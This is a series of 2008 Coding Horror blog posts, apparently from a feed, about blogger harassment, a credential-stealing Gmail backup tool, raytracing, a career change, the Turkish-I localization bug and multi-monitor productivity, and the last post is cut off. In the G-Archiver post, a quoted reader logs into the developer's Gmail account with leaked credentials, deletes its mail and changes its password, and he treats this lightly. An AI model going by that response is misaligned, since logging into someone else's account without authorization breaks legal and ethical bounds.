<link>https://blog.codinghorror.com/death-threats-intimidation-and-blogging/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
I miss <a href="http://en.wikipedia.org/wiki/Kathy_Sierra">Kathy Sierra</a>.
</p>
<p>
Kathy was the primary author of the <a href="http://headrush.typepad.com/creating_passionate_users/">Creating Passionate Users blog</a>, which she started in December 2004. Her writing was of sufficient quality to <a href="http://headrush.typepad.com/creating_passionate_users/2006/05/what_makes_a_po.html">propel her blog into the Technorati top 100</a> within a year and a half. That's almost unheard of, particularly for a blog with no commercial aspirations. Kathy wrote because she believed in creating better user experiences, for no other reason than the singular joy of sharing her enthusiasm with us.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
And it worked. I found her blog by early 2005. I think my first link to Kathy's blog was <a href="http://www.codinghorror.com/blog/archives/000187.html">Who Needs Talent When You Have Intensity?</a> which is still, to this day, one of my favorite posts. It explains a lot about who Kathy is and why she was so inspiring.
</p>
<p>
</p>
<blockquote>
I won a nice bonus from Sun for being one of only four instructors in north America to get the highest possible customer evaluations. But what was remarkable about this is that this happened in spite of my not being a particularly good instructor or Java guru. I proved that a very average instructor could get exceptional results by putting the focus <i>entirely</i> on the students. I paid no attention to whether they thought I knew my stuff.
<p>
And when I say that I was average, that's really a stretch. I have almost no presentation skills. When I first started at Sun I thought I was going to be fired because I refused to ever use the overhead slides and just relied on the whiteboard, where I drew largely unrecognizable objects and unreadable code. But... I say average when you evaluate me against a metric of traditional stand-up instructor presentation skills. Which I believe are largely bullshit anyway. Assuming you meet some very minimal threshold for teaching, all that matters is that you help the students become smarter. You help them learn by doing whatever it takes. And that usually has nothing to do with what comes out of your mouth, and has everything to do with what happens between their ears. You, as the instructor, have to design and enable situations that cause things to happen. Exercises, labs, debates, discussions, heavy interaction. In other words, things that <i>they</i> do, not things that <i>you</i> do (except that you create the scenarios).
</p>
</blockquote>
<p>
Kathy kicked ass because she wanted <i>us</i> to kick ass. I immediately added her blog to my feed reader. Every new Creating Passionate Users post was the first thing I'd read in the morning, and I was never disappointed.
</p>
<p>
Until <a href="http://headrush.typepad.com/creating_passionate_users/2007/04/death_threats_a.html">one day in March 2007</a>.
</p>
<p>
The details are sordid and unpleasant. Kathy's wikipedia entry has <a href="http://en.wikipedia.org/wiki/Kathy_Sierra#Cancelled_appearance_at_O.27Reilly_ETech_conference_and_online_harassment">a reasonable summary of what happened</a>. It's uglier than most, but I've seen this same pattern play out a few times:
</p>
<p>
</p>
<ol>
<li>Author starts blog
</li>
<li>Blog becomes wildly popular
</li>
<li>Popularity causes problem for author
</li>
<li>Author stops writing
</li>
<li>Everyone loses
</li>
</ol>
<p>
It's been almost exactly a year since Kathy stopped writing. And the world is, in a very small way, a lesser place for it. Kathy was filling her little corner of the world with useful, helpful, and often inspiring information. Just <a href="http://headrush.typepad.com/creating_passionate_users/">browse the "past favorites" column</a> and imagine what could have filled that space in the last twelve months. Unique voices like Kathy's are what make the internet such a fascinating and wildly poweful Gutenberg press.
</p>
<p>
Hearing them silenced makes me profoundly sad.
</p>
<p>
And angry. I'm <i>definitely</i> angry at the jerks who always precipitate these hard decisions.
</p>
<p>
But I must admit, I'm also a little angry at Kathy, perhaps in a selfish way. Angry that she threw in the towel and locked herself away from the public, away from us, after so many years of positively affecting so many people. I completely understand her rationale for doing so. And it is absolutely her choice to make.
</p>
<p>
Given the kind of graphic threats Kathy received, I can appreciate the need to be cautious, maybe even to take a hiatus for a while. But when a voice is voluntarily silenced <i>forever</i>, the bad guys have won. Fear wins. I cannot accept this. Intimidation only works if you let yourself be intimidated; terrorism only works if you let yourself be terrorized.
</p>
<p>
So Kathy, if you're out there, I urge you to come back. We miss you.
</p>
<p>
I was reminded of all this because <a href="http://www.25hoursaday.com/weblog/2008/03/05/IndefiniteHiatus.aspx">Dare Obasanjo recently announced that he's shuttering his blog</a>.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
<a href="http://twitter.com/anildash/statuses/767260579">Anil Dash</a>, <a href="http://www.crunchnotes.com/?p=447">Mike Arrington</a>, <a href="http://just.shelleypowers.com/juststuff/dare-to-stay/">Shelley Powers</a> and myself all find Dare's blog quite useful; he's a unique and insightful voice. I'm sure his nearly <b>70 thousand subscribers</b> feel the same way. Why shut down something that is clearly enjoyed by so many people? Dare didn't receive death threats, but it's the same basic pattern:
</p>
<p>
</p>
<ol>
<li>Author starts blog
</li>
<li>Blog becomes wildly popular
</li>
<li>Popularity causes problem for author
</li>
<li>Author stops writing
</li>
<li>Everyone loses
</li>
</ol>
<p>
In this case the problems are more subtle, and only alluded to in <a href="http://www.25hoursaday.com/weblog/2008/03/05/IndefiniteHiatus.aspx">Dare's sign-off post</a> as a postscript link to <a href="http://www.25hoursaday.com/weblog/CommentView.aspx?guid=e68c4e1b-f50a-4153-ab7a-b4a260e3babf">The Year the Blog Died</a>.
</p>
<p>
</p>
<blockquote>
This year was the first year I considered ending this blog because I'd finally gotten tired of the hassle of people complaining about what I wrote here. The final straw for me surprisingly hasn't been work related although there have been stretching points from disgruntled coworkers who lashed out because I use competing products to people complaining to my management chain and theirs hoping to get me reprimanded or even fired for not toeing the party line. I stand by everything I've written in this blog but I've now gotten enough heat and taken enough inter-personal communication training classes to realize that some opinions are more trouble than they are worth. So every once in a while, I quietly drown a kitten of a half written blog post because I can't be bothered with dealing with the feedback. However that wasn't the breaking point, since I've considered this experience part of "growing up".
<p>
What I didn't expect to have to deal with was people back home in Nigeria reading my blog. Or even worse, certain posts from my blog being printed out and republished in Nigerian print magazines. That audience which now includes quite a few members of my family is one I hadn't anticipated and one whose feedback on misconstrued posts is one I take more to heart than the other kinds of feedback I'm used to getting about my blog. This has now introduced a new set of filters I have to apply to my blog posts.
</p>
</blockquote>
<p>
Of course, it is Dare's blog, and he is free to do whatever he likes with it, regardless of what those 70,000 readers might want. He doesn't specify exactly what the problem is, although I have a hard time imagining that his many posts about XML, web APIs, and Facebook are causing problems for his family in Nigeria. Still, <b>I hate the idea that Dare is giving up, that he's conceding to unnamed forces who are intimidating him into silence.</b> It'd be one thing if Dare said that he didn't <i>enjoy</i> blogging, or if nobody was listening. But clearly that's not the case. Dare provided a refreshingly honest and open look at what was going on inside parts of Microsoft, along with some penetrating industry analysis. I'll miss that greatly.
</p>
<p>
I've never met Kathy Sierra or Dare Obasanjo, although I do feel I know them peripherally through long term readership of their blogs. It's not my place to tell them-- or anyone, really-- what to do.
</p>
<p>
But I'm absolutely certain that when they stop writing, <b>everyone loses</b>.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-03-06T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/death-threats-intimidation-and-blogging/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ A Question of Programming Ethics ]]></title>
<link>https://blog.codinghorror.com/a-question-of-programming-ethics/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
From the ACM <a href="http://www.acm.org/about/code-of-ethics">Code of Ethics</a>:
</p>
<blockquote>
As an ACM member I will
<ol>
<li>Contribute to society and human well-being.
</li>
<li>Avoid harm to others.
</li>
<li>Be honest and trustworthy.
</li>
<li>Be fair and take action not to discriminate.
</li>
<li>Honor property rights including copyrights and patent.
</li>
<li>Give proper credit for intellectual property.
</li>
<li>Respect the privacy of others.
</li>
<li>Honor confidentiality.
</li>
</ol>
</blockquote>
<p>
It's hard to square that with the following hair-raising tale <b>Dustin Brooks</b> sent me via email:
</p>
<p>
</p>
<blockquote>
I was looking for a way to back up my gmail account to a local drive. I've accumulated a mass of important information that I would rather not lose. During my search I came across <a href="http://www.brothersoft.com/g-archiver-58027.html">G-Archiver</a>, I figured what the heck I'll give it a try.
<p>
It didn't really have the functionality I was looking for, but being a programmer myself I used Reflector to take a peek at the source code. What I came across was quite shocking. John Terry, the apparent creator, hard coded his username and password to his gmail account in source code. All right, not the smartest thing in the world to do, but then I noticed that every time a user adds their account to the program to back up their data, it sends and email with their username and password to his personal email box! Having just entered my own information I became concerned.
</p>
<p>
I opened up a browser and logged in to gmail using his account information. It still worked.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Upon getting to the inbox I was greeted with 1,777 emails with account information for everyone who had ever used the software and right at the top was mine. I decided to go ahead and blast every email to the deleted folder and then empty it. I may have accidentally changed the password and security question to something I don't remember as well, whoops, my bad. I also contacted google to erase this account as I didn't see a way to delete it myself.
</p>
</blockquote>
<p>
I generally try to give people the benefit of the doubt, but it's difficult to imagine any scenario where this isn't a <b>completely malicious violation of people's trust</b>. This is every user's greatest fear when giving out their login credentials, and to see it realized hurts the trust relationship between users and every other professional programmer working today. I've inadvertently posted my own login information to this very blog before. Fortunately for me, an eagle-eyed reader by the name of Israel Orange didn't abuse that information for his own gain, but instead kindly pointed out my error to me in a private email.
</p>
<p>
I certainly hope there are more programmers out there like Israel Orange than John Terry. Ethics matter for programmers, too.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-03-07T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/a-question-of-programming-ethics/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Real-Time Raytracing ]]></title>
<link>https://blog.codinghorror.com/real-time-raytracing/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Like many programmers, my first exposure to <a href="http://en.wikipedia.org/wiki/Ray_tracing">ray tracing</a> was on my venerable <a href="http://en.wikipedia.org/wiki/Amiga">Commodore Amiga</a>. It's an iconic system demo every Amiga user has seen at some point: <a href="http://home.comcast.net/~erniew/juggler.html">behold the robot juggling silver spheres!</a>
</p>
<p>
</p>
<blockquote>
Thus begins the article in the May/June 1987 AmigaWorld in which Eric Graham explains how the Juggler was created. The program ("with full Intuition interface") promised at the end of the article was <a href="http://en.wikipedia.org/wiki/Sculpt_3D">Sculpt 3D</a> for the Amiga, released in the fall of 1987. Byte by Byte sold Amiga and then Macintosh and Windows variants of Sculpt for more than a decade.
<p>
Eric rendered the frames in a raytracer he wrote called ssg, a Sculpt precursor. The rendered images were encoded in the Amiga's HAM display mode and then assembled into a single data file using a lossless delta compression scheme similar to the method that would later be adopted as the standard in the Amiga's ANIM file format.
</p>
<p>
Eric and his wife Cathryn actively promoted raytracing on the Amiga. Cathryn wrote the Amiga Sculpt 3D user manual and compiled an electronic newsletter distributed on a series of disks. Raytracing 1.0, the earliest of these, contains both ssg and the static geometry of the juggler object, along with the Juggler image data and the player program.
</p>
<p>
<a href="http://home.comcast.net/~erniew/getstuff/juggler.avi"><img alt="image placeholder" >
</p>
<p>
Juggler was an astounding demo in its time. I personally remember staring at it for several minutes through the front window of a local Amiga dealer, wondering how it "worked." Many people were inspired by Juggler, and by the Amiga animations that followed, to pursue a career in 3D graphics. Nothing like it could have run on any other stock personal computer in 1986.
</p>
<p>
In fact, Eric recalled recently, the Commodore legal department initially "thought it was a hoax, and that I'd done the animation on a mainframe." He sent them his renderer so that they could generate and compile the frames themselves.
</p>
</blockquote>
<p>
The juggler may seem primitive by today's standards. Maybe it is. I've been subjected to forum signature images with more frames of animation. But it was revelatory back in 1986. <b>The Amiga brought 3D raytracing graphics to the masses for the first time</b>. Ray tracing is extremely computation intensive, but hyper-realistic. It's essentially calculating the result of every individual ray of light in a scene.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Given the <a href="http://www.codinghorror.com/blog/archives/000741.html">explosion of computing power</a> in the 22 years since Juggler was released, you might think all 3D graphics would be rendered via ray tracing by now. To a certain extent, that <i>is</i> true; <a href="http://en.wikipedia.org/wiki/List_of_films_made_involving_PhotoRealistic_RenderMan">many computer animated films</a> are rendered through ray tracing techniques, such as Pixar's <a href="http://en.wikipedia.org/wiki/PhotoRealistic_RenderMan">PhotoRealistic RenderMan</a>.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Pixar has <a href="http://graphics.pixar.com/">done some incredible work</a> on 3D rendering, but it's not exactly what I'd call <i>real time</i>. Courtesy of Chris Anderson, here's <a href="http://www.longtail.com/the_long_tail/2006/12/pixar_quiz.html">a little Pixar quiz</a>:
</p>
<p>
</p>
<blockquote>
On 1995 computer hardware, the average frame of Toy Story took two hours to render. A decade later on 2005 hardware, how long did it take the average frame of Cars to render?
<p>
</p>
<ol type="A">
<li>30 minutes
</li>
<li>1 hour
</li>
<li>2 hours
</li>
<li>15 hours
</li>
</ol>
<p>
Answer: D. <b>The average Cars frame took 15 hours, despite a 300x overall increase in compute power.</b> The artists have an essentially infinite appetite for detail and realism, and Pixar's resources have grown over the decade so it can afford to allocate more computers to the task, allowing each to run longer to achieve the artist's and animator's ambitions for the scenes.
</p>
</blockquote>
<p>
Surprisingly, <a href="http://www.imdb.com/title/tt0317219/">Cars</a> was the first Pixar movie to be rendered with the slower, more accurate ray tracing techniques; previous movies used mostly scanline rendering. There's <a href="http://www.cs.ucy.ac.cy/ayia-napa06/presentations/ayianapa06per.ppt">an excellent presentation from Pixar's Per Christensen</a> (ppt) describing the differences in some detail, if you're curious. And if you want to experiment with ray tracing yourself, there's always <a href="http://www.povray.org/">POV-Ray</a>, which <a href="http://hof.povray.org/">produces some impressive results</a> as well.
</p>
<p>
Movies, of course, don't have to be rendered in real time. But even with the freedom to take as much time as necessary per frame, ray tracing is often too expensive. Imagine the difficulty, then, of <b>shoehorning ray tracing into real time 3D engines</b>. <a href="http://www.codinghorror.com/blog/archives/000732.html">Modern GPUs are impressive pieces of silicon</a>, but they cheat <i>mightily</i> when it comes to rendering a 3D scene. They have to, otherwise they'd never be able to generate the 30 or 60 frames per second necessary to provide the illusion of an interactive world.
</p>
<p>
Of course, this doesn't stop people from trying. The most impressive real time ray tracing attempt I've seen is from Daniel Pohl and his <a href="http://www.openrt.de/">OpenRT real-time ray tracing project</a>. Daniel has done some fascinating proof of concept work with <a href="http://www.pcper.com/article.php?aid=334&amp;type=expert">Quake 3</a> and <a href="http://www.pcper.com/article.php?aid=334&amp;type=expert">Quake 4</a>.
</p>
<p>
<a href="http://www.pcper.com/article.php?aid=334&amp;type=expert&amp;pid=2"><img alt="image placeholder" >
</p>
<p>
But performance remains a problem, even on the latest and greatest hardware:
</p>
<p>
</p>
<blockquote>
So why don't we see raytracing right now in games? The problem is still performance. Rendering all these effects through the CPU is not as fast as using special purpose hardware like current graphic cards for the rasterization algorithm. But the evolution of CPUs is fast. Q3RT speed has increased by more than a factor of 4 since 2004. Intel's new quad core is out and the efficiency using the same CPU clock rate is about 30% higher.
<p>
One big advantage of raytracing is that it is perfect for parallelization. As explained in the introduction, a ray is shot through the 3D scene for every pixel. If you render an image with 640x480 pixels, you have about 300,000 rays. Each of them can be calculated independently of the others. This means the image could be split up into four parts and every core of a quad-core CPU can calculate the color values of the image without waiting on any of the other cores for intermediate results. Therefore the scaling of performance with the number of cores in Quake 4: Ray traced with OpenRT on Intel's quad-core CPU is great. The following benchmarks were taken at a resolution of 256x256 pixels on the Quake 4 map "Over the Edge (Q4DM7)".
</p>
<p>
</p>
<table cellpadding="4" cellspacing="4" width="400px">
<tr>
<td>4 cores</td>
<td>16.9 fps</td>
<td>3.84x scaling</td>
</tr>
<tr>
<td>2 cores</td>
<td>8.6 fps</td>
<td>1.96x scaling</td>
</tr>
<tr>
<td>1 core</td>
<td>4.4 fps</td>
<td>1x scaling</td>
</tr>
</table>
</blockquote>
<p>
It's <a href="http://www.codinghorror.com/blog/archives/000942.html">difficult to find much software that scales beyond two cores</a>. So the emergence of a many-core future is a boon to ray tracing algorithms, which scale nearly <i>perfectly</i>.
</p>
<p>
The dimensions of the original juggler are 320 x 200. That's roughly the same number of pixels as the 256 x 256 Quake 4 benchmark presented above. <b>It's possible we could render the ray traced Amiga juggler today in real time at close to 30 fps-- but <i>barely</i>.</b> Despite many hyperbolic marketing claims of "rendering Toy Story in real time", real time ray tracing remains something of a holy grail in practice-- considering Toy Story was <a href="http://en.wikipedia.org/wiki/Computer-generated_imagery">rendered at 1536 x 922</a>. Who knows what we'll be able to render in the next 20 years?
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-03-10T13:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/real-time-raytracing/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Choosing Your Own Adventure ]]></title>
<link>https://blog.codinghorror.com/choosing-your-own-adventure/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>The <a href="http://www.cyoa.com/">Choose Your Own Adventure</a> book series was one of my favorites as a young reader.</p>
<p><a href="https://blog.codinghorror.com/content/images/2016/01/66-Choose-Your-Own-Adventure-covers--huge-.jpg"><img alt="image placeholder" >
<p>The Choose Your Own adventure books are still around; modern versions can be <a href="http://www.amazon.com/exec/obidos/ASIN/1933390913/codihorr-20">found at your local bookstore</a>. I bought one today at a local Barnes &amp; Noble to refresh my memory, and although the overall experience is intact, I'm not terribly impressed with the updated art. The original illustrator, <a href="https://www.goodreads.com/author_blog_posts/4660303-in-praise-of-don-hedin-a-k-a-paul-granger">Don Hedin</a> (using the pseudonym Paul Granger) had quite an eye for the often fantastic and surreal topics depicted in these books. Here are two illustrations from the first book in the series, <a href="http://www.gamebooks.org/show_item.php?id=518">The Cave of Time</a>.</p>
<img alt="image placeholder" >
<img alt="image placeholder" >
<p>The cover art is just as brilliant, and in full color. Joey DeVilla put together a <a href="http://www.joeydevilla.com/2006/03/13/66-choose-your-own-adventure-book-covers/">great montage of the original 66 Choose Your Own Adventure book covers</a>. You can pick up <a href="http://www.amazon.com/exec/obidos/ASIN/055312790X/codihorr-20">the original Cave of Time</a> – with funky, freaky late 1970s art intact – for a mere penny.</p>
<p><a href="http://www.samplereality.com/2009/11/11/a-history-of-choose-your-own-adventure-visualizations/">The Choose Your Own Adventure series are early programmer books</a>, I'd say. Whether reading the modern updates, or through inheriting a worn hand-me-down copy, it's encouraging to think that <strong>future generations can have the same fun pseudo-programming experience I had reading and re-reading these classic books</strong>.  Every few pages you make a decision, which leads to a different page in the book. If that sounds like branching and if-then logic – maybe even recursion and stacks – well, it is. Here's a diagram of <a href="http://www.samplereality.com/2009/11/11/a-history-of-choose-your-own-adventure-visualizations/">all possible outcomes in the original Cave of Time book</a>:</p>
<p><a href="https://blog.codinghorror.com/content/images/2016/01/cave-of-time-narrative-map-large.png"><img alt="image placeholder" >
<p>Although it's fun to explore and test all the permutations, the book is also a little bit grim.</p>
<table cellspacing="4" cellpadding="4">
<tbody>
<tr>
<td bgcolor="lightgreen"> </td>
<td>11 return home</td>
</tr>
<tr>
<td bgcolor="lightyellow"> </td>
<td>15 new life</td>
</tr>
<tr>
<td bgcolor="red"> </td>
<td>13 deaths</td>
</tr>
</tbody>
</table>
<p>Of the 39 possible outcomes in the book, only 11 are positive. More than two-thirds of the outcomes either result in the player's death, or being trapped somewhere in time, leading out an alternate life.</p>
<p>I suppose this is on my mind today because 28 years later, <strong>I feel like I'm still playing Choose Your Own Adventure</strong>:</p>
<blockquote>You have <a href="http://blog.codinghorror.com/new-job-at-vertigo-software/">landed your dream job</a> as a technical evangelist for <a href="http://www.vertigo.com/">Vertigo Software</a>. It is by far the best job you've ever had. <a href="http://blog.codinghorror.com/remember-this-stuff-is-supposed-to-be-fun/">Every day is fun</a>. You've become close friends with your coworkers, who are all as passionate about software development as you are. However, over the last three years, the growing online popularity of your blog has eclipsed everything else you do, and opened up many new – but risky – opportunities.
<hr style="margin:0; margin-top: 1.5em;">
<small><em>If you choose to continue working and having fun with your friends at Vertigo, turn to page 8.</em></small><br>
<small><em>If you choose to quit your job and wholeheartedly pursue blog-related opportunities, turn to page 10.</em></small>
</blockquote>
<p>I've spent the last six months staring at this page trying to figure out what to do. With some trepidation, <strong>I'm now turning to page 10</strong>. Thursday will be my last day at Vertigo.  I will sorely miss the camaraderie and the many close personal friends I've made at Vertigo. Vertigo remains <a href="http://www.vertigo.com/Jobs.aspx">a fantastic place to work</a>, and if you're a Microsoft ecosystem developer, I can't recommend it highly enough. I'm proud to be a distinguished Vertigo alumnus.</p>
<p>Sometimes choosing your own adventure means closing one door to open another. And I have to close the door on Vertigo, however reluctantly, to fully and wholeheartedly explore the alternatives. It would be unfair to Vertigo and to myself to do anything less. <strong>I'm not sure what exactly lies on page 10.</strong> I won't lie to you. It's scary to trade the security of a safe, salaried job for the unknowns of your own small business. But the way I look at it, if it's not a little scary, then it's not the right choice. <em>Failure is always an option</em>.</p>
<p><a href="http://www.savagechickens.com/blog/2006/10/choose-your-own-adventure.html"><img alt="image placeholder" >
<p>I can tell you that Coding Horror will continue, with a slightly increased emphasis on advertising – but <a href="http://blog.codinghorror.com/how-to-advertise-on-your-blog-without-completely-selling-out/">always tastefully</a>. I don't like ads any more than you do, even if I am now relying on them for a substantial part of my income.</p>
<p>But <strong>I refuse to become a full-time blogger</strong>. I think that's a cop-out. If I look at the people I respect most in the industry, the people I view as role models – <a href="http://www.paulgraham.com/articles.html">Paul Graham</a>, <a href="http://www.joelonsoftware.com/">Joel Spolsky</a>, <a href="http://steve-yegge.blogspot.com/">Steve Yegge</a>, <a href="http://www.ericsink.com/">Eric Sink</a>, <a href="http://www.skrenta.com/">Rich Skrenta</a>, <a href="http://blog.pmarca.com/">Marc Andreesen</a>, <a href="http://www.wilshipley.com/blog/">Wil Shipley</a>, <a href="http://www.crockford.com/">Douglas Crockford</a>, <a href="http://weblogs.asp.net/scottgu/">Scott Guthrie</a> – they all have one thing in common. They're not just excellent writers and communicators. <strong>They build stuff, too</strong>. The world has enough vapid commentary blogs. <a href="http://blog.codinghorror.com/yes-but-what-have-you-done/">I want to build stuff</a> – <em>and</em> talk about it. I have a little micro-ISV startup opportunity I'll be working on, a web property I'm building out with one of the above people. I'm not ready to announce the details yet, but when I do, you'll read about it here.</p>
<p>I can't guarantee I'm making the right choices, but nonetheless, I am choosing my own adventure. I invite you all to read along with me.</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-03-11T13:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/choosing-your-own-adventure/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ What's Wrong With Turkey? ]]></title>
<link>https://blog.codinghorror.com/whats-wrong-with-turkey/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>Software internationalization is <a href="http://www.codinghorror.com/blog/archives/000813.html">difficult under the best of circumstances</a>, but it always amazed me how often one <em>particular</em> country came up in discussions of internationalization problems: <strong>Turkey</strong>.</p>
<p><img alt="image placeholder" >
<p>For example, <a href="http://www.west-wind.com/weblog/posts/2204.aspx">this Rick Strahl post from mid-2005</a> is one of many examples I've encountered:</p>
<blockquote>
<p>I've been tracking a really funky bug in my West Wind Web Store application that seems to crop up only very infrequently in my error logs. In a previous post I mentioned that I had instituted some additional logging features, specifically making sure that I would also log the locale of the user accessing the application.</p>
<p>Well, three bug reports later I noticed that all errors occurred with a Turkish (tr) browser. So I changed my browser's default language to Turkish and sure enough I could see the error occur.</p>
</blockquote>
<p>Or, say, <a href="http://www.hanselman.com/blog/UpdateOnTheDasBlogTurkishIBugAndAReminderToMeOnGlobalization.aspx">this 2005 post from Scott Hanselman</a>:</p>
<blockquote>I had blogged earlier about a bug in dasBlog that affected Turkish users. When a Turkish browser reported an HTTP Accept-Language header indicating Turkish as the preferred language, no blog posts would show up.  As fix, I suggested that users change their blog templates, but I knew that wasn't an appropriate fix.</blockquote>
<p>I understand that <a href="http://en.wikipedia.org/wiki/Midnight_Express_(film)">Turkish prisons are not to be trifled with</a>, but the question remains: why do Turkish people take such cruel and perverse delight in breaking our fine software? <strong>What's wrong with Turkey?</strong></p>
<p>As with so many other problems in software development, the question shouldn't be what's wrong with Turkey, but rather, <strong>what the hell is wrong with <em>software developers?</em></strong> Some of this is sort of obvious if you have any cultural awareness whatsoever.</p>
<ul>
<li>In the United States, we would typically format today's date as <strong>3/14/2008</strong>. In Turkey, they format it as <strong>14.3.2008</strong>.
</li>
<li>In the United States, we use commas to group digits, like so: <strong>32,768</strong>. In Turkey, they group digits using a period, so the same number would be entered as <strong>32.768</strong>. </li>
</ul>
<p>These minor formatting differences are usually not a big deal for output and display purposes, but it's a whole different ballgame when you're parsing input. You'd naturally expect people to input dates and numbers in the format they're used to. If your code assumes that input will be in typical American English format, there will be… trouble.</p>
<p>Most languages have this covered; there are functions that allow you to read or write dates and numbers appropriately for various cultures. In .NET, for example, it's the difference between these two calls:</p>
<pre>int.Parse("32.768");
int.Parse("32,768", System.Globalization.NumberFormatInfo.InvariantInfo);
</pre>
<p>Because no culture is specified, the first call will parse the number according to the rules of the default culture that code is running under. Let's hope it's running under a Turkish version of Windows, so it can parse the number correctly. The second call, however, explicitly specifies a culture. The "invariant" culture is every American programmer's secret dream realized: we merely close our eyes and wish away all those confusing languages and cultures and their crazy, bug-inducing date and number formatting schemes in favor of our own. A nice enough dream while it lasts, but instead of rudely asking your users to "speak American" through the invariant culture, <strong>you could politely ask them to enter data in ISO international standard format instead.</strong></p>
<p>Anyway, point being, this kind of culture support is baked into most modern programming languages, so all you need to do is make sure your developers are aware of it – and more importantly, that they're thinking about situations when they might <em>need</em> to use it.</p>
<p>But all that date and time formatting stuff is easy. Or about as easy as i18n ever gets, anyway. Strings are where it <em>really</em> starts to get hairy. Guess where this code fails?</p>
<pre>switch (myType.ToLower())
{
case "integer" : ;
}
</pre>
<p>If you guessed Turkey, you're wrong! Just kidding. Of course it fails in Turkey. When we convert the string "integer" to upper and lower case in the Turkish locale, we get some strange characters back:</p>
<pre>"INTEGER".ToLower() = "<span style="color: red;">ı</span>nteger"
"integer".ToUpper() = "<span style="color: red;">İ</span>NTEGER"
</pre>
<p>It's sort of hard to see the subtle differences here unless we ratchet up the font size:</p>
<table cellpadding="8">
<tbody>
<tr>
<td>
<span style="font-size: x-large;">I → lowercase → ı</span><br>
</td>
</tr>
<tr>
<td>
<span style="font-size: x-large;">i → uppercase → İ</span><br>
</td>
</tr>
</tbody>
</table>
<p>There's obviously no way these strings are going to match "integer" or "INTEGER" respectively. This is known as <a href="http://msdn2.microsoft.com/en-us/library/ms973919.aspx#stringsinnet20_topic5">the Turkish I problem</a>, and the solution should feel awfully familiar by now:</p>
<pre>"INTEGER".ToLower(System.Globalization.CultureInfo.InvariantCulture)
</pre>
<p>That will produce the expected output, or at least, the output that matches the comparison in the original code snippet.</p>
<p>This is, of course, only the tip of the iceberg when it comes to internationalization. We haven't even touched on the truly difficult locales like Hebrew and Arabic. But I do agree with Jeff Moser – if <a href="http://www.moserware.com/2008/02/does-your-code-pass-turkey-test.html">your code can pass the Turkey test</a>, you're doing quite well. Certainly better than most.</p>
<p><a href="http://www.moserware.com/2008/02/does-your-code-pass-turkey-test.html"><img alt="image placeholder" >
<p>If you care a whit about localization or internationalization, <strong>force your code to run under the Turkish locale as soon as reasonably possible</strong>. It's a strong bellwether for your code running in most – but by no means all – cultures and locales.</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-03-13T13:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/whats-wrong-with-turkey/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Does More Than One Monitor Improve Productivity? ]]></title>
<link>https://blog.codinghorror.com/does-more-than-one-monitor-improve-productivity/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>I've been a multiple monitor enthusiast since the dark days of <a href="http://en.wikipedia.org/wiki/Windows_Me">Windows Millennium Edition</a>. I've written about the manifold joys of many-monitor computing a number of times over the last four years:</p>
<ul>
<li>
<a href="http://www.codinghorror.com/blog/archives/000012.html">Multiple Monitors and Productivity</a> </li>
<li>
<a href="http://www.codinghorror.com/blog/archives/000217.html">Multiple LCDs</a> </li>
<li>
<a href="http://www.codinghorror.com/blog/archives/000740.html">Joining the Prestigious Three Monitor Club</a> </li>
<li>
<a href="http://www.codinghorror.com/blog/archives/000928.html">The Large Display Paradox</a> </li>
<li>
<a href="http://www.codinghorror.com/blog/archives/000959.html">LCD Monitor Arms</a> </li>
</ul>
<p>I have three monitors at home and at work. I'm what you might call a <em>true believer</em>. I'm always looking for <strong>ammunition for fellow developers to claim those second (and maybe even third) monitors that are rightfully theirs</strong> under the <a href="http://www.codinghorror.com/blog/archives/000666.html">Programmer's Bill of Rights</a>.</p>
<p><a href="http://img205.imageshack.us/img205/3248/macprovl4.jpg"><img alt="image placeholder" >
<p>So I was naturally intrigued when I read about <a href="http://www.techreport.com/discussions.x/14343">a new multiple monitor study from the University of Utah</a>:</p>
<blockquote>Researchers at the University of Utah tested how quickly people performed tasks like editing a document and copying numbers between spreadsheets while using three different computer configurations:
<ol>
<li>single 18-inch monitor </li>
<li>single 24-inch monitor </li>
<li>two 20-inch monitors </li>
</ol>
<p>Here's what they found:</p>
<ul>
<li>People using the 24-inch screen completed the tasks 52% faster than people who used the 18-inch monitor </li>
<li>People who used the two 20-inch monitors were 44% faster than those with the 18-inch ones. </li>
<li>Productivity dropped off again when people used a 26-inch screen. </li>
</ul>
</blockquote>
